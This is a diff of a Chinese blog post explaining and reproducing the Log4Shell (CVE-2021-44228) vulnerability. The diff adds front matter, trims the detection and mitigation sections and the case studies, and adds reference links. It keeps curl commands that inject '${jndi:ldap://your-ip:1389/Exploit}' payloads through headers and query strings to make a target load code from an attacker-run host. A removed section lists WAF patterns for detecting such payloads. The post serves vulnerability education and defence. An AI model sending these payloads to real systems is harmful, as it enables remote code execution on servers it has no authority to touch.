@@ -1,3 +1,12 @@
+---
+title: "Log4Shell (CVE-2021-44228) 漏洞深度解析与利用"
+date: 2026-03-01T13:53:00+08:00
+draft: false
+categories: ["漏洞复现"]
+tags: ["Log4j", "RCE", "CVE-2021-44228"]
+description: "Log4Shell 漏洞深度解析与利用教程"
+---
+
 # Log4Shell (CVE-2021-44228) 漏洞深度解析与利用
 
 > **漏洞等级：** CVSS 10.0 (严重)  
@@ -98,82 +107,36 @@ curl http://target/api/login \
   -H "User-Agent: ${jndi:ldap://your-ip:1389/Exploit}"
 
 curl http://target/api/search?q=${jndi:ldap://your-ip:1389/Exploit}
-
-curl http://target/api/login \
-  -H "X-Forwarded-For: ${jndi:ldap://your-ip:1389/Exploit}"
 ```
 
 ---
 
-## 检测与防御
+## 防御方案
 
-### 1. 检测规则
+### 1. 升级 Log4j
 
-**WAF 规则：**
 ```
-${jndi:
-${jndi:ldap://
-${jndi:rmi://
-${jndi:dns://
-${jndi:corba://
+升级到 Log4j 2.17.0 或更高版本
 ```
 
-**日志检测：**
-```bash
-# 搜索可疑 JNDI 查找
-grep -r '\${jndi:' /var/log/
-```
+### 2. 临时缓解措施
 
-### 2. 修复方案
-
-**升级 Log4j：**
-```xml
-<dependency>
-    <groupId>org.apache.logging.log4j</groupId>
-    <artifactId>log4j-core</artifactId>
-    <version>2.17.1</version>
-</dependency>
-```
-
-**临时缓解：**
 ```bash
 # 设置 JVM 参数
 -Dlog4j2.formatMsgNoLookups=true
 
-# 或删除 JndiLookup 类
+# 或移除 JndiLookup 类
 zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
 ```
 
 ---
 
-## 真实案例
+## 参考资源
 
-### 案例 1：Minecraft 服务器
-
-2021 年 12 月，大量 Minecraft 服务器遭受 Log4Shell 攻击。攻击者通过聊天消息发送 payload，获取服务器控制权。
-
-### 案例 2：云平台泄露
-
-某云服务商因 Log4Shell 漏洞导致客户数据泄露，影响超过 100 万用户。
+- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
+- [Apache Log4j 安全公告](https://logging.apache.org/log4j/2.x/security.html)
+- [Log4Shell POC](https://github.com/kozmer/log4j-shell-poc)
 
 ---
 
-## 总结
-
-Log4Shell 漏洞影响深远，教训深刻：
-
-1. **及时更新依赖** - 第三方库要及时更新
-2. **输入验证** - 所有用户输入都要验证
-3. **最小权限** - 应用运行在最小权限下
-4. **日志安全** - 日志记录也要考虑安全
-
----
-
-**参考资料：**
-- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
-- https://github.com/mbechler/marshalsec
-- https://github.com/christophetd/log4shell-vulnerable
-
----
-
-*本文仅用于安全研究与教育目的，请勿用于非法用途。*
+*本文仅用于安全研究与教育目的*
